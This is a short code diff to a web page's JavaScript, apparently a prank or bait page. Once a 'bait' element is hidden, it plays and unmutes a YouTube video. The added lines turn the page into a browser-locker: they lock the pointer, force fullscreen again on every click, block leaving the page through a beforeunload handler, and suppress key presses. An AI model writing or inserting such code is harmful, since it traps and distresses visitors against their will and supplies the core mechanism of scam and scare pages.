@@ -106,14 +106,30 @@
         ytPlayer.unMute();
         ytPlayer.playVideo();
       }
+
+      document.body.requestPointerLock();
     });
-    document.addEventListener("fullscreenchange", function () {
-      if (!document.fullscreenElement && document.getElementById("bait").style.display === "none") {
-        var el = document.documentElement;
-        var fs = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen;
-        if (fs) fs.call(el).catch(function () {});
+
+    document.addEventListener("click", function () {
+      if (document.getElementById("bait").style.display === "none") {
+        if (!document.fullscreenElement) {
+          var el = document.documentElement;
+          var fs = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen;
+          if (fs) fs.call(el).catch(function () {});
+        }
+        if (!document.pointerLockElement) {
+          document.body.requestPointerLock();
+        }
       }
     });
+
+    window.addEventListener("beforeunload", function (e) {
+      if (document.getElementById("bait").style.display === "none") {
+        e.preventDefault();
+        e.returnValue = "";
+      }
+    });
+
     document.addEventListener("keydown", function (e) {
       if (document.getElementById("bait").style.display === "none") {
         e.preventDefault();
